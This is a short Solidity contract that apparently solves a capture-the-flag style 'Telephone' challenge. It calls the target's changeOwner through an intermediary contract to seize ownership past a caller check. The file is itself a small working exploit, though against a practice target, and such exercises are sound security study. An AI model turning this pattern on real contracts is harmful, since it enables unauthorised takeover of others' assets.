//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./SafeMath.sol";

interface Telephone  {
    function owner() external pure returns (address);
    function changeOwner(address _owner) external;
}

contract Caller {
    using SafeMath for uint256;
    Telephone immutable public telephone;

    constructor(address teleAddr) {
        telephone = Telephone(teleAddr);
    }

    function call(address owner) public {
        telephone.changeOwner(owner);
    }

}
